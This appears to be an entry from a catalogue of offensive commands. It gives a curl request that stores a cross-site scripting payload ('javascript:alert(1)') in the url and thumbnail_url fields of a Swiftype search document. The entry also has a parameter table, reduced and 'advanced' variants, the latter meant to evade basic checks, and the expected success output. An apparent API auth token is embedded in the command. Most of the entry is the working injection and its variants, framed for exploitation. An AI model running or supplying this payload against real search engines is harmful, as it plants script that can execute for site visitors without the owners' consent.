---
id: uuid-inject-command
data: >-
  curl -X POST
  'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json'
  -H 'Content-Type: application/json' -d '{ "auth_token":
  "gB7BT3iA3GhqoU_SWoRq", "document": { "external_id": "v1uyQZNg2vE", "fields":
  [ {"name": "url", "value": "javascript:alert(1)", "type": "enum"}, {"name":
  "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"}, {"name":
  "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"}, {"name":
  "title", "value": "How It Feels [through Glass]", "type": "string"}, {"name":
  "caption", "value": "Want to see how Glass actually feels?...", "type":
  "text"}, {"name": "tags", "value": ["glass", "wearable computing", "google"],
  "type": "string"}, {"name": "category_name", "value": "Science & Technology",
  "type": "string"}, {"name": "category_id", "value": 28, "type": "enum"},
  {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
  {"name": "duration", "value": 136, "type": "integer"}, {"name": "view_count",
  "value": 14599202, "type": "integer"}, {"name": "like_count", "value": 75952,
  "type": "integer"} ] } }'
tags:
  - api
  - xss
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:19.997Z'
verified: false
validated: true
submitted: true
---
# inject-xss-payload-swiftype-api

## Command

```bash
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' -H 'Content-Type: application/json' -d '{ "auth_token": "gB7BT3iA3GhqoU_SWoRq", "document": { "external_id": "v1uyQZNg2vE", "fields": [ {"name": "url", "value": "javascript:alert(1)", "type": "enum"}, {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"}, {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"}, {"name": "title", "value": "How It Feels [through Glass]", "type": "string"}, {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"}, {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"}, {"name": "category_name", "value": "Science & Technology", "type": "string"}, {"name": "category_id", "value": 28, "type": "enum"}, {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"}, {"name": "duration", "value": 136, "type": "integer"}, {"name": "view_count", "value": 14599202, "type": "integer"}, {"name": "like_count", "value": 75952, "type": "integer"} ] } }'
```

## Description

This command sends a POST request to the Swiftype API to create a document in an API-based engine, injecting a stored XSS payload ('javascript:alert(1)') into the 'url' and 'thumbnail_url' fields. Use it during exploitation of Swiftype's lack of URL validation to store malicious JavaScript for later execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for document creation | Yes |
| URL (e.g., https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json) | API endpoint with engine and document type placeholders | Yes |
| `-H 'Content-Type: application/json'` | Sets the request header for JSON payload | Yes |
| `-d` | JSON data string containing auth_token, external_id, and fields array with XSS payload | Yes |
| `auth_token` | API key for authentication (e.g., gB7BT3iA3GhqoU_SWoRq) | Yes |
| `external_id` | Unique identifier for the document (e.g., v1uyQZNg2vE) | Yes |
| `url value` | Malicious payload (e.g., javascript:alert(1)) in enum type field | Yes for exploit |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' -H 'Content-Type: application/json' -d '{ "auth_token": "your_token", "document": { "external_id": "test_id", "fields": [ {"name": "url", "value": "javascript:alert(1)", "type": "enum"} ] } }'
```

### Advanced Usage

Include full fields as in the primary command for realistic document simulation, adding more metadata to evade basic checks.

```bash
curl -X POST 'https://api.swiftype.com/api/v1/engines/custom_engine/document_types/custom_type/documents.json' -H 'Content-Type: application/json' -d '{ ...full payload... }'
```

## Expected Output

JSON response like {"id":"document_id","status":"success"}, with HTTP 200/201 status code confirming creation. The payload is now stored and retrievable via the UI.

## Related

- [[Related Procedure: Inject-XSS-Payload-into-Swiftype-Document-via-API]]
